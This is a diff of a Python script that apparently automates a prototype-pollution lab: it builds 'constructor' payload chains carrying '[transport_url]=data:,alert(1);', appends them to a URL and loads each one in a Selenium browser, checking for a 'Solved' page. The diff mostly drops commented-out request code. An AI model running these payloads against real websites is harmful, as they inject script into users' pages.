@@ -45,21 +45,15 @@ def main(url: str,number_of_times:int=10,file_output:str="payload"):
                 a = True
         if a:
             break
-        #response = http.request('GET', url)
-        #response = response.data.decode('utf-8')
-            #print(response)
-        #if "Solved" in response:
-        #    c.print(pretty_print(url))
-        #    a = True
-        #    break
         evilString = evilString.replace("[transport_url]=data:,alert(1);","")
-            #file.write("\n")
+            
     if not a:
         for i in range(0,number_of_times):
             evilString2 = "const"+evilString2+"ructor"
             evilString2 += "[transport_url]=data:,alert(1);"
             url = url + "?" + evilString2
             try:
+                sleep(1)
                 driver.get(url)
                 sleep(2)
                 print(driver.page_source)
@@ -70,14 +64,6 @@ def main(url: str,number_of_times:int=10,file_output:str="payload"):
                     a = True
             if a:
                 break
-            #response = http.request('GET', url)
-            # Stampa la risposta
-            # print(response.data.decode('utf-8'))
-            #àresponse = response.data.decode('utf-8')
-            #if "Solved" in response:
-            #    c.print(pretty_print(url))
-            #    stop = True
-            #    break
             evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")
 
 
